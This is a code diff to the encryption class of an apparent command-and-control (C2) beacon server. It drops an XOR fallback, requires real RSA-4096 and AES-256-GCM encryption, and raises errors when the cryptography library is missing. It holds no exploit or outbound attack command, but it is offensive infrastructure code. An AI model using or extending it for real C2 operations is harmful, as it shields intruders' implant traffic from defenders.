@@ -84,7 +84,7 @@ class BeaconCrypto:
     def _generate_server_keys(self) -> None:
         """Generate RSA-4096 keypair for server identity."""
         try:
-            from cryptography.hazmat.primitives.asymmetric import rsa, padding
+            from cryptography.hazmat.primitives.asymmetric import rsa
             from cryptography.hazmat.primitives import hashes, serialization
 
             private_key = rsa.generate_private_key(
@@ -97,13 +97,11 @@ class BeaconCrypto:
             )
             self._server_pub_pem = private_key.public_key().public_bytes(
                 serialization.Encoding.PEM,
-                serialization.SubjectPublicKeyInfo,
+                serialization.PublicFormat.SubjectPublicKeyInfo,
             )
             log.info("RSA-4096 server keypair generated")
-        except ImportError:
-            log.warning("cryptography not available — using fallback key derivation")
-            # Fallback: use HKDF-style key derivation from a master secret
-            self._master_secret = secrets.token_bytes(64)
+        except ImportError as exc:
+            raise RuntimeError("cryptography is required for C2 crypto") from exc
 
     @property
     def server_public_key(self) -> bytes:
@@ -172,9 +170,8 @@ class BeaconCrypto:
             mac = hmac.new(session.hmac_key, message, hashlib.sha256).digest()
             return mac + message
 
-        except ImportError:
-            # Fallback XOR (not production-safe, for development only)
-            return self._xor_encrypt(session.aes_key, plaintext)
+        except ImportError as exc:
+            raise RuntimeError("cryptography is required for C2 encryption") from exc
 
     def decrypt(self, session: SessionKeys, data: bytes) -> bytes | None:
         """Decrypt a message using AES-256-GCM.
@@ -210,8 +207,8 @@ class BeaconCrypto:
             plaintext = aesgcm.decrypt(nonce, ciphertext, None)
             return plaintext
 
-        except ImportError:
-            return self._xor_decrypt(session.aes_key, data)
+        except ImportError as exc:
+            raise RuntimeError("cryptography is required for C2 decryption") from exc
         except Exception as exc:
             log.warning("Decryption failed for beacon %s: %s",
                         session.session_id, exc)
@@ -250,19 +247,6 @@ class BeaconCrypto:
         """Derive a unique 12-byte nonce from key + counter."""
         data = key[:16] + struct.pack(">Q", counter)
         return hashlib.sha256(data).digest()[:12]
-
-    @staticmethod
-    def _xor_encrypt(key: bytes, plaintext: bytes) -> bytes:
-        """Fallback XOR encryption for development without cryptography lib."""
-        extended = key * ((len(plaintext) // len(key)) + 1)
-        return bytes(a ^ b for a, b in zip(plaintext, extended))
-
-    @staticmethod
-    def _xor_decrypt(key: bytes, ciphertext: bytes) -> bytes:
-        """Fallback XOR decryption."""
-        extended = key * ((len(ciphertext) // len(key)) + 1)
-        return bytes(a ^ b for a, b in zip(ciphertext, extended))
-
 
 def _wipe_bytes(data: bytes) -> None:
     """Best-effort memory wiping of key material."""
